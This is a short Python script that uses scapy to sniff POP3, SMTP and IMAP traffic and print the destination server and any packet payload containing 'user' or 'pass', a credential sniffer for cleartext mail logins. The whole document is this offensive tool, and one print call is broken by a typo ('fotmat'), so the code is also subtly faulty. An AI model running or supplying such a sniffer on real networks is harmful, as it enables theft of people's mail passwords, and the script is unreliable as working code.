#!/bin/env python3

from scapy.all import *

def mail(packet):
  '''Takes raw packets and prints destination IP and payload'''
  if packet.haslayer(TCP) and packet[TCP].payload:
    mail = str(packet[TCP].payload)

    if "user" in mail.lower() or "pass" in mail.lower():
      print("[*] Server: {}".fotmat(packet[IP].dst))
      print("[*] {}".format(packet[TCP].payload))

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=mail, store=0)
